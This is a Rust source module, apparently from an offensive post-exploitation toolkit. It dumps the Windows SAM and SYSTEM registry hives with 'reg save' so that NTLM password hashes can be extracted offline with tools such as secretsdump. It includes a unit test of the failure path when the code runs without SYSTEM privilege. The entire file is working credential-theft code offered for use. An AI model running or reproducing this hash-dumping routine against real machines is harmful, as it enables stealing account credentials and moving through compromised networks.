//! SAM 导出：reg save 转储 HKLM\SAM + HKLM\SYSTEM 配置单元，供离线解密
//! （secretsdump 等工具提取 NTLM hash）。需要 SYSTEM 权限。

use std::process::Command;

fn run_reg_save(hive: &str, path: &str) -> bool {
    Command::new("reg")
        .args(["save", hive, path, "/y"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// 导出 SAM/SYSTEM 到 `out_dir`，返回 JSON。
pub fn save_sam(out_dir: &str) -> String {
    let sam_path = format!("{}\\SAM", out_dir);
    let system_path = format!("{}\\SYSTEM", out_dir);

    let ok_sam = run_reg_save("HKLM\\SAM", &sam_path);
    let ok_system = run_reg_save("HKLM\\SYSTEM", &system_path);

    if !ok_sam && !ok_system {
        return r#"{"success":false,"error":"reg save failed — need SYSTEM privilege"}"#
            .to_string();
    }

    serde_json::json!({
        "success": true,
        "sam": sam_path,
        "system": system_path,
        "samSaved": ok_sam,
        "systemSaved": ok_system,
    })
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn save_returns_json_without_crash() {
        // 普通权限下 reg save 会失败，验证失败路径不崩溃。
        let r = save_sam("C:\\Users\\Public");
        assert!(r.starts_with('{'), "expected JSON, got: {r}");
    }
}
